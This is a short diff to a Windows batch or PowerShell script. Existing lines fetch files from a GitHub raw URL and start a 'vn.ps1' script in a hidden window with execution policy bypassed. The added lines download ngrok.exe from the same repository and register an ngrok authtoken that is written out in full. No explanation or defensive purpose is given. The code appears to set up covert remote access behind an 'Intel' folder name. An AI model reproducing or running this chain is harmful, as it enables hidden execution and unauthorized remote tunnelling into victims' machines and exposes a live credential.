@@ -13,3 +13,8 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/mai
 
 cmd /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-W Hidden -NoProfile -ExecutionPolicy Bypass -File ""$env:UserProfile\Intel\vn.ps1""'}"
 
+timeout /t 10 /nobreak
+
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/main/ngrok.exe' -O ngrok.exe
+
+./ngrok config add-authtoken 2m2KUs20HJHk71aUPBVj6Rggdik_3u8W3qDASDZpndifoDsCk
